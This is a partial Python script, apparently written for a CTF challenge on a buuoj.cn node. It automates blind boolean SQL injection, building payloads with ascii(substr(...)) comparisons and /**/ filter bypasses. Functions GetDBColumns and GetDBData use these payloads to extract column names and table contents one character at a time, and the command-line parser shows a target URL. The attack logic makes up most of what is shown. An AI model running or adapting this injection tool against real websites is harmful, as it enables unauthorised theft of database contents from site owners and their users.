...
def GetDBColumns(url, dbname, dbtable):
    ...
    for a in range(0, DBColumnCount):
        ...
        for b in range(1, columnLen + 1):
            payload = "''or(ascii(substr((select/**/column_name/**/from/**/information_schema.columns/**/where/**/table_schema='{0}'/**/and/**/table_name='{1}'/**/limit {2},1),{3},1))={4},1,0)"
            targetUrl = url + payload
            # c表示33~127位ASCII中可显示字符
            for c in range(33, 128):
...
def GetDBData(url, dbtable, dbcolumn):
    ...
    for a in range(0, DBDataCount):
        ...
        for b in range(1, dataLen + 1):
            for c in range(33, 128):
                payload = "''or(ascii(substr((select/**/{0}/**/from/**/{1}/**/limit/**/{2},1),{3},1))={4},1,0)"
                targetUrl = url + payload
...
if __name__ == '__main__':
    parser = optparse.OptionParser('usage: python %prog -u url \n\n'
                                   'Example: python %prog -u http://050d49e0-3413-4b9c-804d-94fdf635becb.node4.buuoj.cn:81/search.php?id=1\n')
    # 目标URL参数-u
    parser.add_option('-u', '--url', dest='targetURL', default='http://050d49e0-3413-4b9c-804d-94fdf635becb.node4.buuoj.cn:81/search.php?id=1', type='string',
                      help='target URL')
